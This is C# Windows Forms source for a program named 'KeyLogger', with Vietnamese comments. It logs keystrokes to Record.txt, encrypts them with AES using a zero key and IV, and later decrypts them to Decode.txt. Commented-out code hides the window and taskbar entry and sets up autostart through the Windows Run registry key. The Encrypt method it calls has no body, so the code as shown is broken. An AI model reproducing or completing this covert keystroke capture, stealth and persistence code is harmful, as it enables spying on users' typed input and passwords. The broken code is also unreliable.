using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        string file = "Record.txt";
        string pass = "Password.txt";
        string decode = "Decode.txt";
        int s = 0;
        string k = "";
        byte[] key = new byte[16];
        byte[] iv = new byte[16];
        //Encrypt

        //Decrypt
        static string Decrypt(byte[] cipheredtext, byte[] key, byte[] iv)
        {
            string simpletext = String.Empty;
            using (Aes aes = Aes.Create())
            {
                ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
                using (MemoryStream memoryStream = new MemoryStream(cipheredtext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream))
                        {
                            simpletext = streamReader.ReadToEnd();
                        }
                    }
                }
            }
            return simpletext;
        }

        //
        public Form1()
        {
            InitializeComponent();
            //                                 !!!CANH BAO!!!
            //  KHONG NEN CHAY CODE KHONG HIEN THI FORM VA CODE KHONG HIEN THI TREN TASKBAR CUNG LUC
            //  NEU LO CHAY 2 CODE TREN CUNG LUC, VO TASK-MANAGER -> XOA TIEN TRINH DANG CHAY TRONG VISUAL STUDIO, SAU DO VO COMMENT 2 DONG CODE VA BUILD LAI CHUONG TRINH
            //  NEU DA LO CHAY CA 3 DONG SAU CUNG LUC, VO TASK MANAGER ->STARTUP APPS (BEN TRAI)->DISABLE KEYLOGGER.EXE, SAU DO THUC HIEN NHU DOI VOI 2 CODE TREN CUNG CHUONG TRINH
            //  NHO COMMENT LAI CODE TU KHOI CHAY KHI BAT MAY TINH

            //  Code nay de khong hien form tren man hinh
            //this.Opacity = 0;

            //  Code nay de khong hien form tren taskbar
            //this.ShowInTaskbar = false;

            //  Code de khoi chay chuong trinh sau khi khoi dong may
            /*string keyName = "MyProgram";
            string programPath = Assembly.GetExecutingAssembly().Location;
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(keyName, programPath);*/

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            s = s + 1;
            label5.Text = (5 - s).ToString();
            if (s == 5)//60)
            {
                s = 0;
                if (!File.Exists(file))
                {
                    using (StreamWriter sw = File.CreateText(file))
                    {

                    }
                }
                if (k != "")
                {
                    byte[] encrypted_k = Encrypt(k, key, iv);
                    string encrypted_k_String = Convert.ToBase64String(encrypted_k);
                    using (StreamWriter sw = File.AppendText(file))
                    {
                        sw.WriteLine(encrypted_k_String);
                    }
                    k = "";
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Interval = 1000;
            timer1.Start();
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            k = k + e.KeyCode.ToString() + " ";
            label4.Text = k;

            textBox1.Text = e.KeyCode.ToString();
            textBox2.Text = e.KeyValue.ToString();
            textBox3.Text = e.KeyData.ToString();
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            //
            {
                byte[] encrypted_k = Encrypt(k, key, iv);
                string encrypted_k_String = Convert.ToBase64String(encrypted_k);
                using (StreamWriter sw = File.AppendText(file))
                {
                    sw.WriteLine(encrypted_k_String);
                }
                k = "";
            }
            //
            if (!File.Exists(decode))
            {
                using (StreamWriter sw = File.CreateText(decode))
                {

                }
            }
            string line;
            using (StreamReader sr = new StreamReader(file))
            {
                using (StreamWriter sw = new StreamWriter(decode))
                {
                    while ((line = sr.ReadLine()) != null)
                    {
                        byte[] encrypted_k = Convert.FromBase64String(line);
                        string decrypted_k = Decrypt(encrypted_k, key, iv);
                        sw.WriteLine(decrypted_k);
                    }
                }
            }
        }
    }
}
